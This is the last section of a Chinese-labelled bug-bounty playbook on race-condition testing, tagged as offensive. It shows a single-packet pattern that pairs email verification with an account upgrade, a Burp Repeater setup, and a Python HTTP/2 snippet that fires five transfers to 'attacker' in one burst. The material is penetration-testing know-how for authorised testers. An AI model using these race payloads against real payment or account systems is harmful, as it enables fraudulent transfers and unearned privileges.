---
name: playbook-src-race-condition-test-part4
description: "结构：上半原有是主线（支付/券/库存）；下半补充加深（HTTP/2 单包、Turbo Intruder）。支付/券竞态先看原有，单包手法再开补充。（第 4/4 部分）"
tags: [playbook, src-hunting, race, condition, test]
intent: offensive
---
### Pattern 3: Auth verification + Privileged action

```text
Single TCP segment:
  Stream 1: POST /api/email/verify?token=TOKEN  ← verify email
  Stream 3: POST /api/account/upgrade            ← requires verified email
```

Upgrade may succeed during the brief window where verification is processing but not yet committed.

### Practical setup

Burp Repeater: add requests targeting **different paths** to the same group → "Send group (single packet)".

```python
headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]

all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']

h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
```

---

## Related

- **business-logic-vulnerabilities** — workflow, coupon abuse, and logic-first checklists (`logic-test.md`).

> （续前：playbook-src-race-condition-test 第 4/4 部分）
